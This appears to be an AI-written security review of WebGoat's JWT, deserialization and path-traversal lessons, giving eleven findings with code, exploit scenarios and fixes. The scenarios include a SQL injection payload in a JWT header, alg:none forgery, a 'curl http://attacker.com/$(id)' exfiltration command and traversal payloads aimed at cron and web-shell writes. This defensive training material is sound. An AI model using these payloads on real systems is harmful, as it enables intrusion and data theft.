# Security Review Report — claude-report-2.md

**Prompt Used:** 
```
read .claude\commands\security-review.md and perform a security review on the following folders inside the \src\main\java\org\owasp\webgoat\lessons folder: jwt, deserialization, & pathtraversal.
```

**Date:** 2026-03-31 
**Scope:** `lessons/jwt`, `lessons/deserialization`, `lessons/pathtraversal`
**Reviewer:** Claude (senior security engineer mode)

---

## Summary

| # | Severity | Category | File | Confidence |
|---|----------|----------|------|------------|
| 1 | HIGH | JWT — JKU Header SSRF + Auth Bypass | `JWTHeaderJKUEndpoint.java:57` | 10/10 |
| 2 | HIGH | JWT — KID SQL Injection → Auth Bypass | `JWTHeaderKIDEndpoint.java:76` | 10/10 |
| 3 | HIGH | JWT — Hardcoded Weak Signing Key | `JWTVotesEndpoint.java:55` | 10/10 |
| 4 | HIGH | JWT — `alg:none` Bypass via `parse()` | `JWTRefreshEndpoint.java:91` | 9/10 |
| 5 | HIGH | JWT — Expired Token User Claim Trusted in Refresh | `JWTRefreshEndpoint.java:124` | 9/10 |
| 6 | HIGH | JWT — Predictable Secret from 5-word Corpus | `JWTSecretKeyEndpoint.java:38` | 9/10 |
| 7 | HIGH | Deserialization RCE | `InsecureDeserializationTask.java:45` | 10/10 |
| 8 | HIGH | Path Traversal — File Written Before Traversal Check | `ProfileUploadBase.java:51` | 10/10 |
| 9 | HIGH | Path Traversal — `../` Filter Bypass | `ProfileUploadFix.java:43` | 9/10 |
| 10 | HIGH | Path Traversal — Traversal via Original Filename | `ProfileUploadRemoveUserInput.java:41` | 10/10 |
| 11 | HIGH | Path Traversal — Zip Slip | `ProfileZipSlip.java:79` | 10/10 |

---

## Findings

---

### Vuln 1: JWT — JKU Header SSRF + Auth Bypass — `JWTHeaderJKUEndpoint.java:57`

* **Severity:** HIGH
* **Category:** JWT Issues / SSRF / Auth Bypass
* **Confidence:** 10/10

**Description:**
`POST /JWT/jku/delete` reads the `jku` (JSON Web Key URL) claim directly from the attacker-supplied JWT header and makes an outbound HTTP request to that URL to fetch public keys. There is no allowlist or validation on the JKU URL value.

```java
// JWTHeaderJKUEndpoint.java:55-60
var decodedJWT = JWT.decode(token);
var jku = decodedJWT.getHeaderClaim("jku");
var jwkProvider = new JwkProviderBuilder(new URL(jku.asString())).build(); // no allowlist
var jwk = jwkProvider.get(decodedJWT.getKeyId());
var algorithm = Algorithm.RSA256((RSAPublicKey) jwk.getPublicKey());
JWT.require(algorithm).build().verify(decodedJWT);
```

**Exploit Scenario:**
1. Attacker generates their own RSA key pair.
2. Attacker hosts a JWK Set at `https://attacker.com/jwks.json` containing their public key.
3. Attacker crafts a JWT with header `{"alg":"RS256","kid":"attacker-key","jku":"https://attacker.com/jwks.json"}` and payload `{"username":"Tom"}`, signed with their private key.
4. Server fetches the attacker's JWK set, verifies the signature as valid, and grants "Tom" access.

This is a full authentication bypass requiring no prior credentials. The same outbound request also constitutes a server-side request forgery, enabling internal network probing.

**Recommendation:** Validate the `jku` URL against a strict allowlist of trusted key set URLs before making any outbound connection. Never trust header claims in a JWT to direct security-critical operations.

---

### Vuln 2: JWT — KID SQL Injection → Auth Bypass — `JWTHeaderKIDEndpoint.java:76`

* **Severity:** HIGH
* **Category:** SQL Injection / JWT Issues / Auth Bypass
* **Confidence:** 10/10

**Description:**
`POST /JWT/kid/delete` extracts the `kid` (Key ID) header from the attacker-supplied JWT and concatenates it directly into a SQL query to look up the signing key. The query is executed via a raw `Statement`, with no parameterization or input validation.

```java
// JWTHeaderKIDEndpoint.java:70-79
final String kid = (String) header.get("kid");
try (var connection = dataSource.getConnection()) {
  ResultSet rs =
      connection
          .createStatement()
          .executeQuery(
              "SELECT key FROM jwt_keys WHERE id = '" + kid + "'"); // kid is attacker-controlled
  while (rs.next()) {
    return TextCodec.BASE64.decode(rs.getString(1));
  }
```

**Exploit Scenario:**
1. Attacker chooses an arbitrary HMAC secret, e.g., `secret`.
2. Attacker crafts a JWT with `kid: "' UNION SELECT 'c2VjcmV0' -- "` (base64 for "secret").
3. The injected SQL query returns `secret` as the key value.
4. Attacker signs a JWT with payload `{"username":"Tom"}` using `secret` as the HMAC key.
5. Server looks up the key via the injected query, gets back `secret`, verifies the signature successfully, and grants "Tom" access.

This combines SQL injection with JWT signature bypass for a full authentication bypass with no prior knowledge of any legitimate key.

**Recommendation:** Use a `PreparedStatement` with a `?` placeholder for the `kid` lookup. Additionally, validate that the key ID matches a known format before executing any database query.

---

### Vuln 3: JWT — Hardcoded Weak Signing Key — `JWTVotesEndpoint.java:55`

* **Severity:** HIGH
* **Category:** JWT Issues / Weak Crypto
* **Confidence:** 10/10

**Description:**
The HMAC-HS512 signing key for the voting endpoint is hardcoded as a `public static final` constant, initialized directly from the English word `"victory"`.

```java
// JWTVotesEndpoint.java:55
public static final String JWT_PASSWORD = TextCodec.BASE64.encode("victory");
```

The key is also `public static`, making it accessible to any class in the application — and readable in the compiled bytecode.

**Exploit Scenario:**
1. Attacker runs a JWT cracking tool (e.g., `hashcat -a 0 -m 16500`) against any intercepted token. With a dictionary containing "victory", the key is recovered in milliseconds.
2. Attacker re-signs any token with `admin: true` and any valid username.
3. `POST /JWT/votings` now treats the attacker as admin, resetting all votes.

**Recommendation:** Use a cryptographically random secret of at least 256 bits, generated at startup and stored in a secrets manager or environment variable. Never hardcode signing keys.

---

### Vuln 4: JWT — `alg:none` Bypass via `parse()` — `JWTRefreshEndpoint.java:91`

* **Severity:** HIGH
* **Category:** JWT Issues / Auth Bypass
* **Confidence:** 9/10

**Description:**
`POST /JWT/refresh/checkout` uses `Jwts.parser().setSigningKey(JWT_PASSWORD).parse()` — the unsigned-token-permissive `parse()` variant — rather than `parseClaimsJws()`. Older versions of JJWT (used here) allow `parse()` to accept `alg:none` unsigned tokens, ignoring the configured signing key entirely. The code itself acknowledges this path at line 95 by branching on the "none" algorithm.

```java
// JWTRefreshEndpoint.java:91-98
Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
Claims claims = (Claims) jwt.getBody();
String user = (String) claims.get("user");
if ("Tom".equals(user)) {
    if ("none".equals(jwt.getHeader().get("alg"))) {   // the server explicitly handles this case
        return ok(success(this).feedback("jwt-refresh-alg-none").build());
    }
    return ok(success(this).build());
}
```

**Exploit Scenario:**
1. Attacker base64-decodes any valid JWT to observe the structure.
2. Attacker crafts a new JWT with header `{"alg":"none"}` and payload `{"user":"Tom","admin":"true"}`.
3. The forged token has an empty signature segment.
4. Server's `parse()` accepts it, extracts `user=Tom`, and returns success.

**Recommendation:** Replace `parse()` with `parseClaimsJws()`, which unconditionally rejects unsigned tokens. Reject any token where the `alg` header is `"none"` or absent.

---

### Vuln 5: JWT — Expired Token User Claim Trusted in Refresh — `JWTRefreshEndpoint.java:124`

* **Severity:** HIGH
* **Category:** JWT Issues / Privilege Escalation
* **Confidence:** 9/10

**Description:**
`POST /JWT/refresh/newToken` handles expired tokens by catching `ExpiredJwtException` and extracting the `user` claim from the exception's embedded claims. It then issues a **new** token for whichever user is named in the expired token — without verifying that the refresh token was originally issued to that user.

```java
// JWTRefreshEndpoint.java:119-133
try {
    Jwt<Header, Claims> jwt =
        Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
    user = (String) jwt.getBody().get("user");
    refreshToken = (String) json.get("refresh_token");
} catch (ExpiredJwtException e) {
    user = (String) e.getClaims().get("user");   // user from *attacker-provided* expired token
    refreshToken = (String) json.get("refresh_token");
}
// ...
if (validRefreshTokens.contains(refreshToken)) {
    validRefreshTokens.remove(refreshToken);
    return ok(createNewTokens(user));   // new token issued for the untrusted user claim
}
```

**Exploit Scenario:**
1. Attacker logs in as Jerry (the only allowed login) and obtains a valid refresh token.
2. Attacker obtains or crafts an expired JWT with `user: Tom` (even a legitimately expired token works, or a freshly forged one signed with a known-weak key).
3. Attacker presents the expired "Tom" token + Jerry's valid refresh token to `/JWT/refresh/newToken`.
4. Server extracts `user=Tom` from the expired claims and issues a fresh, valid "Tom" token.

**Recommendation:** Bind refresh tokens to a specific user identity at issuance. When a refresh token is redeemed, assert that the user in the refresh token record matches the user in the access token before issuing new credentials.

---

### Vuln 6: JWT — Predictable Secret from 5-word Corpus — `JWTSecretKeyEndpoint.java:38`

* **Severity:** HIGH
* **Category:** JWT Issues / Weak Crypto
* **Confidence:** 9/10

**Description:**
`JWT_SECRET` is initialized once at class load time by randomly selecting from a 5-element hardcoded word list: `{"victory", "business", "available", "shipping", "washington"}`.

```java
// JWTSecretKeyEndpoint.java:34-38
public static final String[] SECRETS = {
    "victory", "business", "available", "shipping", "washington"
};
public static final String JWT_SECRET =
    TextCodec.BASE64.encode(SECRETS[new Random().nextInt(SECRETS.length)]);
```

The entire keyspace is 5 values, all known from source code. An attacker can try all 5 in under a second.

**Exploit Scenario:**
1. Attacker intercepts any token issued by `GET /JWT/secret/gettoken`.
2. Attacker tries all 5 candidates — e.g., using `jwt_tool` or a trivial script.
3. One of the 5 verifies the signature. The key is recovered.
4. Attacker forges a token with `username: WebGoat` and all required claims, submits it to `POST /JWT/secret`.

**Recommendation:** Generate a cryptographically random secret (e.g., `SecureRandom` with ≥256 bits) at startup and store it outside of source code.

---

### Vuln 7: Deserialization RCE — `InsecureDeserializationTask.java:45`

* **Severity:** HIGH
* **Category:** Deserialization RCE
* **Confidence:** 10/10

**Description:**
`POST /InsecureDeserialization/task` accepts a base64-encoded blob, decodes it, and passes it directly to `ObjectInputStream.readObject()` with no class filtering or allowlisting. The dangerous `readObject()` call fires **before** the `instanceof VulnerableTaskHolder` check — meaning any deserialization gadget chain in the classpath executes during the `readObject()` call itself, regardless of the type check result.

```java
// InsecureDeserializationTask.java:42-51
try (ObjectInputStream ois =
    new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) {
  before = System.currentTimeMillis();
  Object o = ois.readObject();           // RCE fires HERE — before any type check
  if (!(o instanceof VulnerableTaskHolder)) {
    // ... too late, gadget already executed
  }
```

The presence of `VulnerableTaskHolder` (from `org.dummy.insecure.framework`) in the classpath provides a ready-made gadget that executes a system command during deserialization.

**Exploit Scenario:**
1. Attacker serializes a `VulnerableTaskHolder` (or another gadget chain via ysoserial) with a payload command such as `curl http://attacker.com/$(id)`.
2. Attacker base64-encodes the serialized blob and submits it as the `token` parameter.
3. The server calls `readObject()`, the gadget triggers, and the OS command executes with the JVM's privileges.
4. The type check afterward is irrelevant — RCE already occurred.

**Recommendation:** Replace raw `ObjectInputStream` with a deserialization filter using `ObjectInputFilter` (Java 9+) that allowlists only `VulnerableTaskHolder`. Better still, replace Java serialization entirely with a data format that does not support arbitrary code execution (e.g., JSON).

---

### Vuln 8: Path Traversal — File Written Before Traversal Check — `ProfileUploadBase.java:51`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`ProfileUploadBase.execute()` constructs a file path from the user-controlled `fullName` parameter and writes the uploaded content to disk **before** checking whether the resolved path escapes the intended upload directory. The traversal detection (via `getCanonicalPath()` comparison) happens after the file has already been created and populated.

```java
// ProfileUploadBase.java:51-57
var uploadedFile = new File(uploadDirectory, fullName);
uploadedFile.createNewFile();                          // file created at traversed path
FileCopyUtils.copy(file.getBytes(), uploadedFile);     // content written to traversed path

if (attemptWasMade(uploadDirectory, uploadedFile)) {   // detection AFTER write — too late
    return solvedIt(uploadedFile);
}
```

This affects both `ProfileUpload` (`POST /PathTraversal/profile-upload`) and `ProfileUploadFix` (after its inadequate filter is bypassed).

**Exploit Scenario:**
An attacker sends `fullName=../../../tmp/malicious` with any file content. The server resolves the path, creates the file outside `PathTraversal/<username>/`, writes the content, then detects the traversal — but the file has already been written. With sufficient write permissions, an attacker could overwrite application config files, deploy a web shell, or corrupt other users' data.

**Recommendation:** Resolve the canonical path of the target file **before** any `createNewFile()` or write operation. Reject the request immediately if the canonical path does not start with the canonical path of the intended upload directory.

---

### Vuln 9: Path Traversal — `../` Filter Bypass — `ProfileUploadFix.java:43`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 9/10

**Description:**
`POST /PathTraversal/profile-upload-fix` attempts to prevent path traversal by stripping literal `"../"` from the `fullName` parameter. This is a naive blacklist that is trivially bypassed.

```java
// ProfileUploadFix.java:43
return super.execute(file, fullName != null ? fullName.replace("../", "") : "", username);
```

**Bypass payloads:**
- `....//` → after `replace("../", "")` → `../`
- `..././` → after replace → `../`
- `....\/` → after replace → `..\` (Windows path separator)

**Exploit Scenario:**
An attacker sends `fullName=....//....//....//etc/cron.d/backdoor`. After the `replace("../", "")` call, the string becomes `../../../etc/cron.d/backdoor`. This is then passed to `super.execute()`, which creates the file at the traversed location (see Vuln 8 for the write-before-check issue).

**Recommendation:** Do not use string replacement to sanitize path components. Use `Path.normalize()` followed by a canonical path prefix check:
```java
Path resolved = uploadDirectory.toPath().resolve(fullName).normalize();
if (!resolved.startsWith(uploadDirectory.toPath())) { reject(); }
```

---

### Vuln 10: Path Traversal — Traversal via Original Filename — `ProfileUploadRemoveUserInput.java:41`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`POST /PathTraversal/profile-upload-remove-user-input` removes the user-supplied `fullName` parameter to avoid injection, but replaces it with `file.getOriginalFilename()` — which is also fully attacker-controlled and is sourced from the `Content-Disposition` header of the multipart upload.

```java
// ProfileUploadRemoveUserInput.java:41
return super.execute(file, file.getOriginalFilename(), username);
```

The original filename can contain arbitrary path traversal sequences: `../../etc/cron.d/backdoor`.

**Exploit Scenario:**
Attacker crafts a multipart request where the filename in the `Content-Disposition` header is `../../../tmp/evil.jsp`. This is passed directly to `super.execute()` as `fullName`, which then writes the file to the traversed location (same write-before-check flow as Vuln 8).

**Recommendation:** Never trust `getOriginalFilename()`. Strip all path components, keeping only the base filename: `Paths.get(file.getOriginalFilename()).getFileName().toString()`. Then apply a canonical path check as described in Vuln 9.

---

### Vuln 11: Path Traversal — Zip Slip — `ProfileZipSlip.java:79`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`POST /PathTraversal/zip-slip` extracts ZIP archive entries using `e.getName()` to construct destination paths, without any validation that the resolved path stays within the intended extraction directory. This is the classic "Zip Slip" vulnerability.

```java
// ProfileZipSlip.java:77-81
while (entries.hasMoreElements()) {
    ZipEntry e = entries.nextElement();
    File f = new File(tmpZipDirectory.toFile(), e.getName()); // e.getName() is attacker-controlled
    InputStream is = zip.getInputStream(e);
    Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING); // no path check before write
}
```

There is no `getCanonicalPath()` check anywhere in this extraction loop.

**Exploit Scenario:**
Attacker creates a ZIP containing an entry named `../../etc/cron.d/backdoor` with a malicious cron payload as content. Server extracts the file, resolving `../../` above `tmpZipDirectory`, and writes the content to the host filesystem. With write access to sensitive directories (cron, web root, SSH authorized_keys), this leads to persistent code execution.

**Recommendation:** For every ZIP entry, assert that the canonical destination path starts with the canonical extraction directory path before writing:
```java
File dest = new File(targetDir, entry.getName());
if (!dest.getCanonicalPath().startsWith(targetDir.getCanonicalPath() + File.separator)) {
    throw new IOException("Zip Slip detected: " + entry.getName());
}
```
